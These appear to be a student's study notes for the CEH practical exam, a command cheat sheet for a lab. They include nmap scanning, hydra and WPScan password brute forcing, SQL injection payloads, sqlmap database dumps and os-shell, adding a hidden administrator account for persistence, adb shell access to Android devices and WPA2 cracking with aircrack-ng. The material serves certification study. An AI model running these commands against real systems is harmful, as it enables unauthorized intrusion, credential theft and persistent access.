---
description: A set of preparation notes for CEH practical
---

# CEH Practical Prep Notes

## Scanning Networks (always do sudo su) -> To be root

#### Nmap scan for alive/active hosts

```
nmap -A 192.189.19.0/24
nmap -T4 -A 192.189.19.0/24
nmap -f 10.10.10.16
```

The `-A` flag is for an aggressive scan it includes: OS detection (`-O`), Version (`-sV`), Script (`-sC`) and traceroute (`--traceroute`).&#x20;

If the host is Windows then use this command:

```
nmap --script smb-os-discovery.nse 192.168.12.22 
```

The above script determines the OS, computer name, domain, workgroup, and time over smb protocol (ports 445 or 139).

#### nmap command for source port manipulation

In this, the port is given or we use a common port&#x20;

```
nmap -g 80 10.10.10.10
```

## Enumeration

### NetBIOS enum&#x20;

#### Using windows nbtstat

In cmd

```
nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
```

#### Using nmap&#x20;

```
nmap -sV -v --script nbstat.nse 10.10.10.16
```

#### Using enum4linux

```
enum4linux -u martin -p apple -n 10.10.10.10 (all info)
enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
```

### SNMP enumeration using nmap

```
nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
```

### DNS Recon/Enum

```
dnsrecon -d www.google.com -z
```

### FTP enum using nmap

```
nmap -p 21 -A 10.10.10.10 
```

## Snow and Openstego (Steganography)

### Hide Data Using Whitespace Steganography

{% code overflow="wrap" %}
```
snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt
```
{% endcode %}

The phrase "magic" is the password, stored using `-p` and your secret, stored using `-m`, is stored in readme2.txt along with the content of readme.txt.

### To Display Hidden Data

```
snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
```



## Sniffing

### Password Sniffing using Wireshark&#x20;

1. In the pcap file apply the filter: `http.request.method==POST` (you will get all the post requests)&#x20;
2. Now to capture the password click on edit in the menu bar.&#x20;
3. Then near the "Find packet" section, on the "display filter" select "string".
4. Also, select "Packet details" from the drop-down of "Packet list", and also change "narrow & wide" to "Narrow UTF-8 & ASCII".
5. Then type "pwd" in the find section.

## Hacking Web Servers

### Footprinting web server Using Netcat and Telnet:&#x20;

```
nc -vv www.movies.com 80
GET /HTTP/1.0
```

```
telnet www.movies.com 80
GET /HTTP/1.0
```

### Enumerate Web server info using nmap &#x20;

```
nmap -sV --script=http-enum www.movies.com
```

### Crack FTP credentials using nmap &#x20;

#### Check if FTP port is open or not

```
nmap -p 21 10.10.10.10
ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
```

Desktop > CEH tools folder you will find wordlists, here you will find usernames and password files.

Now in terminal type: &#x20;

{% code overflow="wrap" %}
```
hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
hydra -l user -P passlist.txt ftp://10.10.10.10
```
{% endcode %}

## Hacking Web Application

### Scan Using OWASP ZAP (Parrot)&#x20;

Type zaproxy in the terminal and then it will open. In the target tab put the url and click automated scan.

### Directory Bruteforcing&#x20;

```
gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
```

### Enumerate a Web Application using WPscan &#x20;

```
wpscan --url http://10.10.10.10:8080/NEW --enumerate username  
```

Then type msfconsole to open metasploit and use:

```
use auxiliary/scanner/http/wordpress_login_enum
show options
set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
set RHOSTS 10.10.10.10  (target ip)
set RPORT 8080          (target port)
set TARGETURI http://10.10.10.10:8080/
set USERNAME admin
```

Brute Force Using WPScan

{% code overflow="wrap" %}
```
wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt
wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the username)
```
{% endcode %}

Add user for persistence (Command Injection):

```
net user  (Find users)
dir C:\  (directory listing)
net user Test/Add  (Add a user)
net user Test      (Check a user)
net localgroup Administrators Test/Add   (To convert the test account to admin)
net user Test      (Once again check to see if it has become administrator)
```

Now you can do an RDP connection with the given ip and the Test account which you created.

## SQL Injections

{% code overflow="wrap" %}
```
1- Auth Bypass:  
hi'OR 1=1 --

2- Insert new details if sql injection found in login page in username tab enter: 
blah';insert into login values('john','apple123');--

3- Exploit a Blind SQL Injection: 
In the website profile, do inspect element and in the console tab write -  
document.cookie
Then copy the cookie value that was presented after this command. 
Then go to terminal and type this command:
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs

4- Command to check tables of database retrieved:  
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables

5- Select the table you want to dump:  
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)

6- For the OS shell this is the command:   
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell

6.1 In the shell type:
TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all OS version
6.3 Use uname -a for linux to get os version
```
{% endcode %}

## Android

{% code overflow="wrap" %}
```
1- nmap ip -sV -p 5555    (Scan for adb port)
2- adb connect IP:5555    (Connect adb with parrot)
3- adb shell              (Access mobile device on parrot)
4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
```
{% endcode %}

## Wireshark

<pre data-overflow="wrap"><code>tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
<strong>
</strong><strong>tcp.flags.syn == 1   (Which machine for dos)
</strong>http.request.method == POST   (for passwords) or click tools ---> credentials
Also
</code></pre>

## Find FQDN

```
nmap -p389 –sV -iL <target_list>  
nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
```

## Cracking Wi-Fi networks

{% code overflow="wrap" %}
```
aircrack-ng [pcap file] (For cracking WEP network)
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)

```
{% endcode %}

## Health Checks

{% code overflow="wrap" %}
```
the Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from the target subnet)
Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
```
{% endcode %}

## Disk Encryption with Veracyrpt

1. Create a new volume using create volume button&#x20;

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption><p>create volume button</p></figcaption></figure>

2. Create an encrypted file container. This creates a volume like Local Disk C:.&#x20;

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption><p>encrypted file container option</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption><p>select a volme location and name it.</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

